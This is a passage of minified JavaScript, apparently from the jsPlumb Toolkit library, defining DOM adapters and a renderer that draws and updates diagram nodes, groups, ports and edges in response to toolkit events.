    b.mouseEvents = ["click", "dblclick", "contextmenu", "mousedown", "mouseup", "mousemove", "mouseenter", "mouseleave", "mouseover"], b.createElement = function (a, b) {
        var c = {width: a.width, height: a.height, position: a.position || h.absolute}, d = {};
        a.display && (c.display = a.display), a.id && (d.id = a.id), a.top && (c.top = a.top + "px"), a.left && (c.left = a.left + "px"), a.right && (c.right = a.right + "px"), a.bottom && (c.bottom = a.bottom + "px");
        var e = f.createElement(a.type || h.div, c, a.clazz, d);
        return null != b && f.appendElement(e, b), e
    };
    var m = function (a) {
        var b = this.getJsPlumb(), c = b.getElement(a.container);
        this.getWidth = function () {
            return b.getSize(c)[0]
        }, this.getHeight = function () {
            return b.getSize(c)[1]
        }, this.append = function (a) {
            var d = b.getElement(a);
            b.appendElement(d, c)
        }, this.remove = function (a) {
            var c = b.getElement(a);
            b.removeElement(c)
        }, this.setAbsolutePosition = f.setAbsolutePosition, this.getOffset = function (a, c) {
            return b.getOffset(a, c)
        }
    };
    b.DOMElementAdapter = m;
    var n = function (a) {
        this.getOffset = function () {
            return a.getOffset.apply(a, arguments)
        }, this.append = function () {
            return a.append.apply(a, arguments)
        }, this.setAbsolutePosition = function () {
            return a.setAbsolutePosition.apply(a, arguments)
        }, this.floatElement = function () {
            return a.floatElement.apply(a, arguments)
        }, this.fixElement = function () {
            return a.fixElement.apply(a, arguments)
        }
    }, o = function (a, b) {
        n.apply(this, [b]), this.getElements = a.getNodes, this.filter = function (b) {
            return "Node" === b.objectType && b.group == a
        }, this.setElementPosition = function (a, c, d) {
            return b.setAbsolutePosition(a, [c, d])
        }
    }, p = function (a) {
        n.apply(this, [a]), this.filter = function (a) {
            return "Group" === a.objectType || "Node" === a.objectType && null == a.group
        }, this.getElements = function () {
            var b = a.getNodes().filter(function (a, b) {
                return null == a.group
            });
            return Array.prototype.push.apply(b, a.getGroups()), b
        }, this.setElementPosition = function (b, c, d) {
            return a.setPosition.apply(a, [b, c, d, !1, !0])
        }
    }, q = b.AbstractRenderer = function (a) {
        function b(a) {
            fa = !0;
            try {
                a()
            } catch (a) {
                jsPlumbUtil.log("An error occurred while ignoring Toolkit events", a)
            } finally {
                fa = !1
            }
        }

        function m(a, b) {
            wa.push({event: a, fn: b}), J.bind(a, b)
        }

        function n() {
            for (var a = [], b = 0; b < Ka.length; b++) {
                var c = I.getRenderedElement(Ka[b][0].target), d = I.getRenderedElement(Ka[b][0].source);
                c && d ? Ka[b][1]() : a.push(Ka[b])
            }
            Ka = a
        }

        function q(a, b, c, d, e, g, h, i, j) {
            b = $.getElement(b), b.setAttribute(i, c), f.addClass(b, h), b.jtk = b.jtk || {}, b.jtk[d] = a, b.jtk.node = g, j && M && Ya.makeDraggable && Ya.makeDraggable(b, e.dragOptions), N && Ya.makeDroppable && Ya.makeDroppable(b, e.dropOptions);
            var k = function (a) {
                $.on(b, a, function (c) {
                    var d = {el: b, e: c, toolkit: J, renderer: I};
                    d["Node" === g.objectType ? "node" : "group"] = g, e.events[a](d)
                })
            };
            if (e && e.events) for (var l in e.events) k(l)
        }

        function r(a, b, c, d) {
            ia[d.id + J.getGraph().getPortSeparator() + b.id] = a, Xa(a, d), I.fire(l.portAdded, {
                node: d,
                nodeEl: c,
                port: b,
                portEl: a
            })
        }

        function s(a, b, c) {
            if (null == a.value("jtk-processed")) {
                a.setValue("jtk-processed", !0);
                var d = Ua(a, b, c), e = $.addEndpoint(a.element, d);
                Ra[b.id + "." + d.portId] = e;
                var f = a.port || b.addPort({id: d.portId});
                e.graph = {node: b, port: f}, H.onUpdate(a.element, function () {
                })
            }
        }

        function t(a, b) {
            if (b.events) for (var c in b.events) $.on(a, c, b.events[c])
        }

        function u(a, b, c) {
            if (null == a.value("jtk-processed")) {
                a.setValue("jtk-processed", !0);
                var d = Ua(a, b, c);
                d.rank = "Node" === b.objectType ? 10 : 0, null != d.portId && (ia[b.id + "." + d.portId] = a.element, a.element.jtk = a.element.jtk || {}, a.element.jtk.port = J.addPort(b, {
                    id: d.portId,
                    type: d.portType || "default"
                }, !0), t(a.element, d));
                var e = a.value("filter");
                if (e) {
                    var g = a.value("filter-exclude"), h = "true" === g;
                    d.filter = e, d.filterExclude = h
                }
                if ("true" === a.value("is-source") && (d.isSource = !0), delete d.uniqueEndpoint, delete d.createEndpoint, d.extract = {}, a.findDataValues(d.extract), "true" === a.value("endpoint")) {
                    d.maxConnections = -1, d.isSource = !0;
                    var i = $.addEndpoint(a.element, d);
                    i.graph = {}, i.graph["Node" === b.objectType ? "node" : "group"] = b, Sa[b.id] = i, H.onUpdate(a.element, function () {
                    })
                } else {
                    var j, k = a.element._katavorioDrop ? a.element._katavorioDrop.length : 0;
                    $.makeSource(a.element, d);
                    (a.element._katavorioDrop ? a.element._katavorioDrop.length : 0) > k && (j = a.element._katavorioDrop[a.element._katavorioDrop.length - 1]), H.onUpdate(a.element, function (a, c) {
                        var d = f.getSelector(a, "jtk-source");
                        if (1 === d.length) {
                            var e = Ua(d[0], b);
                            e.scope && ($.setSourceScope(a, e.scope, e.edgeType), j && j.k.setDropScope(j, e.scope))
                        }
                    })
                }
            }
        }

        function v(a, b, c) {
            if (null == a.value("jtk-processed")) {
                a.setValue("jtk-processed", !0);
                var d = Ua(a, b, c);
                if (d.rank = "Node" === b.objectType ? 10 : 0, null != d.portId && (ia[b.id + "." + d.portId] = a.element, a.element.jtk = a.element.jtk || {}, a.element.jtk.port = J.addPort(b, {
                    id: d.portId,
                    type: d.portType || "default"
                }, !0), t(a.element, d)), "true" === a.value("is-target") && (d.isTarget = !0), delete d.uniqueEndpoint, delete d.createEndpoint, "true" === a.value("endpoint")) {
                    d.maxConnections = -1, d.isTarget = !0;
                    var e = $.addEndpoint(a.element, d);
                    e.graph = {}, e.graph["Node" === b.objectType ? "node" : "group"] = b, Ta[b.id] = e, H.onUpdate(a.element, function () {
                    })
                } else {
                    $.makeTarget(a.element, d);
                    var g = a.element._katavorioDrop[a.element._katavorioDrop.length - 1];
                    H.onUpdate(a.element, function (a, c) {
                        var d = f.getSelector(a, "jtk-target");
                        if (1 === d.length) {
                            var e = Ua(d[0], b);
                            e.scope && (g.targetDef.def.scope = e.scope, g.k.setDropScope(g, e.scope))
                        }
                    })
                }
            }
        }

        function w(a) {
            var b = a.info || B(a.node);
            if (b && b.obj) {
                if (!1 !== a.updateLayout) {
                    (b.obj.group ? b.obj.group.layout : K).setPosition(b.id, a.x, a.y)
                }
                a.doNotUpdateElement || ($.setAbsolutePosition(b.el, [a.x, a.y], a.animateFrom, a.animateOptions), $.revalidate(b.el))
            }
            return b
        }

        function x(a) {
            return !1 !== a.endpoints[0].element._jtkVisible && !1 !== a.endpoints[1].element._jtkVisible
        }

        function y(a, b, c) {
            if (1 === b.connections.length) b.setVisible(c, !0); else if (c) b.setVisible(!0, !0); else {
                for (var d = 0; d < b.connections.length; d++) if (b.connections[d] !== a && b.connections[d].isVisible()) return;
                b.setVisible(!1, !0)
            }
        }

        function z(a, b, c) {
            var d = pa(a);
            if (d) {
                (!b || x(d)) && (d.setVisible(b), c || (y(d, d.endpoints[0], b), y(d, d.endpoints[1], b)))
            }
        }

        function A(a, b) {
            var c;
            if (a.eachNode && a.eachEdge) c = {nodes: [], edges: []}, a.eachNode(function (a, d) {
                c.nodes.push(b(B(d)))
            }), a.eachEdge(function (a, d) {
                c.edges.push(b(B(d)))
            }); else if (a.length && "string" != typeof a) {
                c = [];
                for (var d = 0; d < a.length; d++) c.push(b(B(a[d])))
            } else c = b(B(a));
            return c
        }

        function B(a) {
            return a instanceof $.getDefaultConnectionType() && (a = a.edge), J.getObjectInfo(a, function (a) {
                return a.getNode ? ia[a.getFullId()] || ga[a.getNode().id] : ga[a.id] || ja[a.id]
            })
        }

        a = a || {};
        var C = function (a, b) {
                var c = f.createElement("div", {border: "1px solid #456", position: "absolute"}, k.NODE);
                return c.innerHTML = a.name || a.id, c
            }, D = '<div data-jtk-node-id="${id}" class="' + k.NODE + '"></div>', E = {
                rotors: {
                    render: function (a, b) {
                        return H.template(a, b).childNodes[0]
                    }
                }
            }, F = "rotors", G = !0 === a.debug,
            H = g.newInstance({defaultTemplate: D, templateResolver: a.templateResolver, templates: a.templates}),
            I = this, J = a.toolkit, K = new c.Layouts.EmptyLayout(new p(I)), L = f.getElement(a.container),
            M = !(!1 === a.elementsDraggable), N = !0 === a.elementsDroppable, O = !1,
            P = !1 !== a.refreshAutomatically,
            Q = a.templateRenderer ? e.isString(a.templateRenderer) ? E[a.templateRenderer] : {render: a.templateRenderer} : E[F],
            R = !1 !== a.enhancedView, S = a.assignPosse || function () {
                return null
            }, T = a.modelLeftAttribute || "left", U = a.modelTopAttribute || "top", V = !1 !== a.storePositionsInModel,
            W = a.objectFilter || function () {
                return !0
            }, X = !0 === a.ignoreGroups, Y = !0 === a.renderPortsAsynchronously, Z = e.merge(a.jsPlumb || {}),
            $ = a.jsPlumbInstance || f.getInstance(Z, a.overrideFns), _ = $.getId(L);
        $.bind("beforeDrop", function (a) {
            var b = a.connection, c = b.endpoints[0].graph || b.source.jtk, d = b.endpoints[1].graph || b.target.jtk,
                e = c.port || c.node || c.group, f = d.port || d.node || d.group, g = a.connection.edge;
            return null == g ? J.beforeConnect(e, f, a.connection.getData()) : J.beforeMoveConnection(e, f, g)
        }), $.bind("beforeDrag", function (a) {
            var b = a.endpoint.graph || a.source.jtk, c = b.port || b.node, d = a.endpoint.connectionType,
                e = J.beforeStartConnect(c, d);
            if (G) {
                var f = Fa.getEdgeDefinition(d) || {};
                console.log("\n------------------------\nDrag started with edge type `" + d + "`, having definition :"), console.log(f), console.log("Edge source is a " + c.objectType + ", having type [" + c.getType() + "], with definition :");
                var g = Fa["get" + c.objectType + "Definition"](c.getType()) || {};
                console.log(g), console.log("Toolkit response to drag start :"), console.log(e), console.log("---------------------------\n")
            }
            return !1 === e && a.endpoint.isTemporarySource && a.endpoint._deleteOnDetach && $.deleteEndpoint(a.endpoint), e
        }), $.bind("beforeDetach", function (a, b) {
            var c = a.endpoints[0].graph || a.source.jtk, d = a.endpoints[1].graph || a.target.jtk,
                e = c.port || c.node, f = d.port || d.node, g = a.edge;
            return J.beforeDetach(e, f, g, b)
        }), $.bind("beforeStartDetach", function (a) {
            var b = a.endpoint.graph || a.source.jtk, c = b.port || b.node, d = a.connection.edge;
            return J.beforeStartDetach(c, d)
        }), $.bind("connectionEdit", function (a) {
            a.edge && (a.edge.geometry = a.getConnector().getGeometry())
        }), e.EventGenerator.apply(this, arguments), a.activeFiltering && new c.UI.ActiveDragFilter(I, $, J), this.setDebug = function (a) {
            G = a, console.log("-----------------------\nSurface debug switched " + (a ? "on" : "off") + " \n-------------------------\n")
        }, this.getJsPlumb = function () {
            return $
        }, this.getToolkit = function () {
            return J
        };
        var aa = [l.canvasClick, l.canvasDblClick, l.nodeAdded, l.nodeDropped, l.nodeRemoved, l.nodeRendered, l.groupAdded, l.groupRemoved, l.groupMoveEnd, l.groupMemberAdded, l.groupMemberRemoved, l.groupCollapse, l.groupExpand, l.groupRelayout, l.nodeMoveStart, l.nodeMoveEnd, l.portAdded, l.portRemoved, l.edgeAdded, l.edgeRemoved, l.edgeTypeChanged, l.nodeTypeChanged, l.portTypeChanged, l.dataLoadEnd, l.anchorChanged, l.objectRepainted, l.modeChanged, l.lassoEnd, l.pan, l.zoom, l.relayout, l.click, l.tap, l.stateRestored, l.startOverlayAnimation, l.endOverlayAnimation, l.nodeVisibility],
            ba = I.bind, ca = $.bind;
        if (this.setHoverSuspended = $.setHoverSuspended, this.isHoverSuspended = $.isHoverSuspended, this.setJsPlumbDefaults = function (a) {
            delete a.Container, $.restoreDefaults(), $.importDefaults(a)
        }, this.bind = function (a, b) {
            -1 == aa.indexOf(a) ? ca(a, b) : ba(a, b)
        }, a.events) for (var da in a.events) this.bind(da, a.events[da]);
        if (a.interceptors) for (var ea in a.interceptors) this.bind(ea, a.interceptors[ea]);
        var fa = !1;
        ca(l.connection, function (a) {
            if (null == a.connection.edge) {
                a.sourceEndpoint.getParameter("nodeId") || a.sourceEndpoint.setParameter("nodeId", ha[a.sourceEndpoint.elementId].id), a.targetEndpoint.getParameter("nodeId") || a.targetEndpoint.setParameter("nodeId", ha[a.targetEndpoint.elementId].id);
                var b = a.sourceEndpoint.getParameter("portType"), c = Fa.getPortDefinition(b),
                    d = null != c && c.edgeType ? c.edgeType : a.sourceEndpoint.getParameter("edgeType") || "default",
                    e = a.sourceEndpoint.getParameter("nodeId"), f = a.sourceEndpoint.getParameter("portId"),
                    g = a.targetEndpoint.getParameter("nodeId"), h = a.targetEndpoint.getParameter("portId"),
                    i = e + (f ? "." + f : ""), j = g + (h ? "." + h : ""), k = {
                        sourceNodeId: e,
                        sourcePortId: f,
                        targetNodeId: g,
                        targetPortId: h,
                        type: d,
                        source: J.getNode(i),
                        target: J.getNode(j),
                        sourceId: i,
                        targetId: j
                    };
                !1 === J.getEdgeFactory()(d, a.connection.getData() || {}, function (b) {
                    k.edge = J.addEdge({
                        source: i,
                        target: j,
                        cost: a.connection.getCost(),
                        directed: a.connection.isDirected(),
                        data: b,
                        addedByMouse: !0
                    }, I), oa[k.edge.getId()] = a.connection, a.connection.edge = k.edge, sa(d, k.edge, a.connection), k.addedByMouse = !0, k.connection = a.connection, I.fire(l.edgeAdded, k)
                }) && $.deleteConnection(a.connection)
            }
        }), ca(l.connectionMoved, function (a) {
            var c = 0 === a.index ? a.newSourceEndpoint : a.newTargetEndpoint, d = c.graph || c.element.jtk;
            b(function () {
                J.edgeMoved(a.connection.edge, d.port || d.node || d.group, a.index)
            })
        }), ca(l.connectionDetached, function (a) {
            b(function () {
                J.removeEdge(a.connection.edge)
            });
            var c = a.sourceEndpoint.getParameters(), d = a.targetEndpoint.getParameters(),
                e = c.nodeId + (c.portId ? "." + c.portId : ""), f = d.nodeId + (d.portId ? "." + d.portId : "");
            I.fire(l.edgeRemoved, {
                sourceNodeId: c.nodeId,
                targetNodeId: d.nodeId,
                sourcePortId: c.portId,
                targetPortId: d.portId,
                sourceId: e,
                targetId: f,
                source: J.getNode(e),
                target: J.getNode(f),
                edge: a.connection.edge
            })
        }), ca(l.groupDragStop, function (a) {
            I.getLayout().setPosition(a.group.id, a.pos[0], a.pos[1], !0), a.uigroup = a.group, I.fire(l.groupMoveEnd, f.extend(a, {group: J.getGroup(a.uigroup.id)}))
        }), ca(l.groupMemberAdded, function (a) {
            if (!O && a.el.jtk && a.el.jtk.node) {
                var b = null == a.sourceGroup ? null : J.getGroup(a.sourceGroup.id),
                    c = J.addToGroup(a.el.jtk.node, a.group.id, b);
                c && (a.el._droppedOnGroup = !0, I.fire(l.groupMemberAdded, {
                    node: a.el.jtk.node,
                    group: c,
                    uigroup: a.group,
                    sourceGroup: b
                }))
            }
        }), ca(l.groupMemberRemoved, function (a) {
            if (!O && a.el.jtk && a.el.jtk.node) {
                var b = null == a.targetGroup ? null : J.getGroup(a.targetGroup.id),
                    c = J.removeFromGroup(a.el.jtk.node, !1, b);
                c && (I.nodeRemovedFromGroup(a.el), I.fire(l.groupMemberRemoved, {
                    node: a.el.jtk.node,
                    ugroup: c,
                    igroup: a.group,
                    targetGroup: b
                }))
            }
        }), ca(l.groupCollapse, function (a) {
            var b = J.getGroup(a.group.id);
            b && I.fire(l.groupCollapse, {group: b, uigroup: a.group})
        }), ca(l.groupExpand, function (a) {
            var b = J.getGroup(a.group.id);
            b && I.fire(l.groupExpand, {group: b, uigroup: a.group})
        });
        var ga = {}, ha = {}, ia = {}, ja = {}, ka = [], la = {}, ma = [], na = function (a) {
            var b = ma.indexOf(a);
            -1 !== b && ma.splice(b, 1)
        };
        this.getNodeCount = function () {
            return ma.length
        }, this.getNodeAt = function (a) {
            return ma[a]
        }, this.getNodes = function () {
            return ma
        }, this.getNode = function (a) {
            return ga[a]
        }, this.getGroupCount = function () {
            return ka.length
        }, this.getGroupAt = function (a) {
            return ka[a]
        }, this.getGroups = function () {
            return ka
        };
        var oa = {}, pa = function (a) {
            return oa[a.getId()]
        }, qa = function (a) {
            for (var b = [], c = 0; c < a.length; c++) b.push(oa[a[c].getId()]);
            return b
        }, ra = function (a, b, c, d) {
            d.bind(a, function (a, e) {
                b.apply(b, [{edge: c, e: e, connection: d, toolkit: J, renderer: I}])
            })
        }, sa = function (a, b, c) {
            if (!c.getParameter("edge")) {
                var d = Fa.getEdgeDefinition(a);
                if (d && d.events) for (var e in d.events) ra(e, d.events[e], b, c)
            }
        }, ta = function (a) {
            I.fire(l.edgeRemoved, {
                sourceNodeId: a.source.getNode ? a.source.getNode().getId : a.source.getFullId(),
                targetNodeId: a.target.getNode ? a.target.getNode().getId : a.target.getFullId(),
                sourcePortId: "Port" === a.source.objectType ? a.source.id : null,
                targetPortId: "Port" === a.target.objectType ? a.target.id : null,
                sourceId: a.source.getFullId(),
                targetId: a.target.getFullId(),
                source: a.source,
                target: a.target,
                edge: a
            })
        };
        this.setSuspendRendering = function (a, b) {
            O = a, $.setSuspendDrawing(a), b && this.refresh()
        }, this.batch = function (a) {
            this.setSuspendEvents(!0), J.batch(a), this.setSuspendEvents(!1)
        };
        var ua = function (a, b) {
            if (O) xa.push([a, b]); else {
                var c = S(b);
                if (null != c) {
                    var d = e.isArray(c) ? c : [c];
                    d.unshift(a), $.addToPosse.apply($, d)
                }
            }
        }, va = function () {
            for (var a = 0; a < xa.length; a++) ua.apply(this, xa[a])
        }, wa = [], xa = [];
        if (!1 !== this.bindToolkitEvents) {
            var ya = function () {
                xa.length = 0, $.setSuspendDrawing(!0), this.setSuspendRendering(!0)
            }.bind(this);
            m(l.dataLoadStart, ya), m(l.dataAppendStart, ya), m(l.dataLoadEnd, function () {
                this.setSuspendRendering(!1), va(), $.getGroupManager().refreshAllGroups(), I.relayout(), $.setSuspendDrawing(!1, !0), K && I.fire(l.dataLoadEnd)
            }.bind(this)), m(l.dataAppendEnd, function () {
                this.setSuspendRendering(!1), va(), I.refresh(), $.setSuspendDrawing(!1, !0), K && I.fire(l.dataAppendEnd)
            }.bind(this));
            var za = function (a, b, c) {
                var d = ja[c.id];
                if (d) {
                    (d.querySelector("[jtk-group-content]") || d).appendChild(a), $.addToGroup(c.id, a, !0), c.layout.nodeAdded({
                        node: b,
                        el: a
                    }), I.nodeAppendedToGroup(a, d, c)
                }
            }, Aa = function (a, b) {
                var c = ga[a.id];
                if (null == c) {
                    if (!0 === Fa.getNodeDefinition(J.getNodeType(a.data)).ignore) return !1;
                    if (!(c = Ma(a, a.data, a))) throw new Error("Cannot render node");
                    var d = $.getId(c);
                    ga[a.id] = c, ha[d] = a, ma.push(a), c.jtk = {node: a}, null == a.group || X ? I.append(c, d, b ? b.position : null) : za(c, a, a.group), ua(c, a), Xa(c, a);
                    var e = {node: a, el: c, id: a.id};
                    (null == a.group || X) && I.getLayout().nodeAdded(e, b), I.fire(l.nodeAdded, e)
                }
                return c
            };
            m(l.nodeAdded, function (a) {
                var b, c = a.node;
                if (W(c)) {
                    var d = Aa(c, a.eventInfo);
                    if (null != d) {
                        var e = $.getSelector(d, "[data-port-id]");
                        for (b = 0; b < e.length; b++) {
                            var f = e[b].getAttribute("data-port-id");
                            ia[c.id + "." + f] = e[b], e[b].jtk = e[b].jtk || {node: c, port: c.getPort(f)}
                        }
                        I.refresh(!0)
                    }
                }
            }), m(l.nodeRemoved, function (a) {
                (a.node.group ? a.node.group.layout : I.getLayout()).nodeRemoved({node: a.node});
                var b = ga[a.nodeId];
                I.fire(l.nodeRemoved, {node: a.node, el: b});
                var c = $.getId(b);
                H.remove(b), $.remove(b), delete ga[a.nodeId], delete Sa[a.nodeId], delete Ta[a.nodeId], delete ha[c], na(a.node), delete b.jtk, I.refresh(!0)
            }), m(l.groupMemberAdded, function (a) {
                var b = ga[a.node.id];
                b && (I.fire(l.groupMemberAdded, a), I.getJsPlumb().addToGroup(a.group.id, b, !0), K.nodeRemoved(a), a.sourceGroup && a.sourceGroup.layout.nodeRemoved(a), a.group.layout.nodeAdded({
                    node: a.node,
                    el: b
                }), I.relayoutGroup(a.group))
            }), m(l.groupMemberRemoved, function (a) {
                var b = ga[a.node.id];
                if (b) {
                    if (I.fire(l.groupMemberRemoved, a), I.getJsPlumb().removeFromGroup(a.group.id, b, !0), a.group.layout.nodeRemoved(a), a.targetGroup) a.targetGroup.layout.nodeAdded({node: a.node}); else {
                        K.nodeAdded({node: a.node, el: b});
                        var c = I.getJsPlumb().getOffset(b);
                        I.getLayout().setPosition(a.node.id, c.left, c.top)
                    }
                    I.relayoutGroup(a.group)
                }
            });
            var Ba = function (b, c) {
                if (!X) {
                    var d = ja[b.id];
                    if (null == d) {
                        var g = Fa.getGroupDefinition(J.getNodeType(b.data));
                        if (!0 === g.ignore) return !1;
                        if (!(d = Oa(b, b.data, b))) throw new Error("Cannot render Group");
                        var i = $.getId(d);
                        ja[b.id] = d, ka.push(b), la[i] = b, d.jtk = {group: b}, I.append(d, i, c ? c.position : null), ua(d, b), Xa(d, b);
                        var j = {group: b, el: d}, k = {el: d, id: b.id};
                        f.extend(k, {dragOptions: a.dragOptions || {}}), k.dragOptions[f.dragEvents[h.stop]] = e.wrap(k.dragOptions[f.dragEvents[h.stop]], function (a) {
                            a.el.jtk && a.el.jtk.group && (k.dragOptions.magnetize ? a.pos = I.getLayout().setMagnetizedPosition(a.el.jtk.group.id, a.pos[0], a.pos[1], !0) : I.getLayout().setPosition(a.el.jtk.group.id, a.pos[0], a.pos[1], !0), !1 !== V && (I.storePositionInModel({
                                id: a.el.jtk.group.id,
                                group: !0,
                                leftAttribute: T,
                                topAttribute: U
                            }), J.fire(l.groupUpdated, {group: a.el.jtk.group}, null)), I.fire(l.groupMoveEnd, {
                                el: a.el,
                                group: a.el.jtk.group,
                                pos: a.pos,
                                e: a.e,
                                eventPosition: a.pos
                            }))
                        }), $.addGroup(f.extend(k, g));
                        var m = g.layout || {type: "Absolute"};
                        b.layout = Qa(m, b), I.getLayout().groupAdded({
                            group: b,
                            el: d,
                            id: b.id
                        }, c), I.fire(l.groupAdded, j)
                    }
                    return d
                }
            };
            m(l.groupAdded, function (a) {
                var b = a.group;
                if (W(b)) {
                    null != Ba(b, a.eventInfo) && I.refresh(!0)
                }
            }), m(l.groupRemoved, function (a) {
                var b = a.group;
                I.getLayout().groupRemoved({group: b});
                var c = ja[b.id], d = $.getId(c), e = $.removeGroup(b.id, a.removeChildNodes, !0, !0), f = null;
                if (null != e) {
                    f = {};
                    for (var g in e) {
                        var h = ha[g];
                        null != h && (w({
                            node: h,
                            x: e[g].left,
                            y: e[g].top,
                            doNotUpdateElement: !0
                        }), f[h.id] = [e[g].left, e[g].top])
                    }
                }
                I.fire(l.groupRemoved, {
                    group: b,
                    el: c,
                    nodes: a.nodes,
                    nodesRemoved: a.removeChildNodes,
                    nodePositions: f
                }), ka = ka.filter(function (b) {
                    return b.id !== a.group.id
                }), delete ja[b.id], delete la[d], delete c.jtk
            }), this.expandGroup = function (a) {
                $.expandGroup("string" == typeof a ? a : a.id)
            }, this.collapseGroup = function (a) {
                $.collapseGroup("string" == typeof a ? a : a.id)
            }, this.toggleGroup = function (a) {
                $.toggleGroup("string" == typeof a ? a : a.id)
            };
            var Ca = function (a, b) {
                var c = $.getGroup(a.id), d = c.getDragArea(), e = a.layout.getExtents(), f = b.maxSize || [e[2], e[3]];
                if (d.style.width = Math.min(f[0], e[2]) + "px", d.style.height = Math.min(f[1], e[3]) + "px", I.setSize) {
                    var g = $.getSize(c.getEl());
                    I.setSize(a.id, g[0], g[1])
                }
            }, Da = function (a) {
                for (var b in ja) {
                    var c = J.getGroup(b);
                    if (c) {
                        var d = Fa.getGroupDefinition(J.getNodeType(c.data));
                        (d.autoSize || a) && Ca(c, d)
                    }
                }
            };
            I.autoSizeGroups = Da, I.sizeGroupToFit = function (a, b) {
                if (a) {
                    var c = Fa.getGroupDefinition(J.getNodeType(a.data));
                    (c.autoSize || b) && Ca(a, c)
                }
            };
            var Ea = function (b, c) {
                return function () {
                    var d = Ia(b);
                    d.doNotFireConnectionEvent = !0, c && (d.geometry = c), J.isDebugEnabled() && console.log("Renderer", "adding edge with params", d);
                    var e = $.connect(d);
                    e.edge = b, oa[b.getId()] = e, sa(d.type, b, e), I.fire(l.edgeAdded, {
                        source: b.source,
                        target: b.target,
                        connection: e,
                        edge: b,
                        geometry: c
                    }), a.refreshLayoutOnEdgeConnect && I.refresh(!0);
                    var f = b.source.getNode ? b.source.getNode() : b.source, g = ga[f.id] || ja[f.id],
                        h = b.target.getNode ? b.target.getNode() : b.target;
                    !1 !== (ga[h.id] || ja[h.id])._jtkVisible && !1 !== g._jtkVisible || z(b, !1)
                }
            };
            m(l.edgeAdded, function (b) {
                if (!fa && b.source !== I) {
                    var c = b.edge;
                    if (W(c.source) && W(c.target) && (!X || c.source.objectType !== h.groupType && c.target.objectType !== h.groupType)) {
                        var d = Fa.getEdgeDefinition(J.getEdgeType(c.data || {}));
                        if (d && !0 === d.ignore) return;
                        var e = Ea(c, b.geometry);
                        a.connectionHandler ? a.connectionHandler(c, e) : e()
                    }
                }
            }), m(l.edgeRemoved, function (a) {
                if (!fa && a.source !== I) {
                    var b = a.edge, c = oa[b.getId()];
                    c && (J.isDebugEnabled() && console.log("Renderer", "removing edge", b), ta(b), delete oa[b.getId()], null != c._jsPlumb && $.deleteConnection(c, {fireEvent: !1}))
                }
            }), m(l.edgeTypeChanged, function (a) {
                if (!fa && a.source !== I) {
                    var b = a.obj, c = oa[b.getId()];
                    if (c) {
                        var d = Fa.getEdgeDefinition(a.newType);
                        if (d && !0 === d.ignore) return;
                        d.connector && c.setConnector(d.connector), c.setType(a.newType, b.data)
                    }
                }
            }), m(l.edgeTarget, function (a) {
                if (!fa) {
                    var b = a.edge, c = oa[b.getId()], d = ga[b.target.getFullId()] || ja[b.target.getFullId()];
                    c ? $.silently(function () {
                        null != d ? (J.isDebugEnabled() && console.log("target change", c), $.setTarget(c, d)) : (delete oa[b.getId()], $.detach({
                            connection: c,
                            forceDetach: !0,
                            fireEvent: !1
                        }))
                    }) : null != d && J.isDebugEnabled() && e.log("Target for Edge " + b.getId() + " changed to Node " + d.id + "; we have no valid connection.")
                }
            }), m(l.edgeSource, function (a) {
                if (!fa) {
                    var b = a.edge, c = oa[b.getId()], d = ga[b.source.getFullId()] || ja[b.source.getFullId()];
                    c ? $.silently(function () {
                        null != d ? $.setSource(c, d) : (delete oa[b.getId()], $.detach({
                            connection: c,
                            forceDetach: !0,
                            fireEvent: !1
                        }))
                    }) : null != d && J.isDebugEnabled() && e.log("Source for Edge " + b.getId() + " changed to Node " + d.id + "; we have no valid connection.")
                }
            }), m("graphClearStart", function () {
                $.reset(!0);
                for (var a in ja) void 0 !== ja[a]._rotors && H.remove(ja[a]), ja[a].parentNode && ja[a].parentNode.removeChild(ja[a]);
                for (var b in ga) void 0 !== ga[b]._rotors && H.remove(ga[b]), ga[b].parentNode && ga[b].parentNode.removeChild(ga[b]);
                K && K.clear(), ma.length = 0, ka.length = 0, oa = {}, ga = {}, ja = {}, ha = {}, la = {}, ia = {}, Ra = {}, I.getZoom && $.setZoom(I.getZoom())
            }), m(l.portAdded, function (a) {
                var b = ga[a.node.id] || ja[a.node.id];
                if (Fa.getPortDefinition(J.getPortType(a.data)).isEndpoint) s(new Wa(a.data, b, a.port), a.node); else {
                    var c = Na(a.port, a.data, a.node);
                    Y || (null != c ? (c = $.getElement(c), r(c, a.port, b, a.node)) : jsPlumbToolkitUtil.log("no element rendered for port", a.port, a.data))
                }
                $.recalculateOffsets(b), I.refresh(!0)
            }), m(l.portRemoved, function (a) {
                var b = ga[a.node.id] || ja[a.node.id], c = a.node.id + "." + a.port.id, d = ia[c];
                null != d && ($.setSuspendEvents(!0), $.remove(d), $.setSuspendEvents(!1), delete ia[c], I.fire(l.portRemoved, {
                    node: a.node,
                    port: a.port,
                    portEl: d,
                    nodeEl: b
                }), $.recalculateOffsets(b), I.refresh(!0))
            }), m(l.edgeUpdated, function (a) {
                var b = oa[a.edge.getId()];
                if (b) {
                    var c = Ia(a.edge);
                    b.setType(c.type, c.data)
                }
            }), m(l.portUpdated, function (a) {
                var b = ia[a.port.getFullId()];
                b && (H.update(b, a.port.data), I.repaint(ga[a.node.id]))
            }), m(l.nodeUpdated, function (a) {
                var b = ga[a.node.getFullId()];
                if (b) {
                    H.update(b, a.node.data), Xa(b, a.node);
                    var c = S(a.node);
                    if (null != c) {
                        var d = e.isArray(c) ? c : [c];
                        d.unshift(b), $.setPosse.apply($, d)
                    } else $.removeFromAllPosses(b);
                    I.repaint(b)
                }
            }), m(l.groupUpdated, function (a) {
                var b = ja[a.group.getFullId()];
                if (b) {
                    H.update(b, a.group.data), Xa(b, a.group);
                    var c = S(a.group);
                    if (null != c) {
                        var d = e.isArray(c) ? c : [c];
                        d.unshift(b), $.setPosse.apply($, d)
                    } else $.removeFromAllPosses(b);
                    I.repaint(b)
                }
            })
        }
        var Fa;
        this.setView = function (a) {
            var b = e.merge(J.getModel(), a || {});
            Fa = new c.Model(b, $)
        }, this.setView(a.view), this.getView = function () {
            return Fa
        };
        var Ga = [], Ha = function (a) {
            return null == a ? J : "string" == typeof a ? J.select(a, !0) : a.jtk ? J.select(a.jtk.port || a.jtk.node, !0) : a
        };
        this.activateState = function (a, b) {
            var c = Fa.getState(a);
            c && (b = Ha(b), c.activate(b, I, J), Ga.push(c))
        }, this.deactivateState = function (a, b) {
            var c = Fa.getState(a);
            c && (b = Ha(b), c.deactivate(b, I, J), e.removeWithFunction(Ga, function (a) {
                return a == c
            }))
        }, this.resetState = function () {
            for (var a = 0; a < Ga.length; a++) Ga[a].deactivate(J, I, J);
            Ga.length = 0
        };
        var Ia = function (a) {
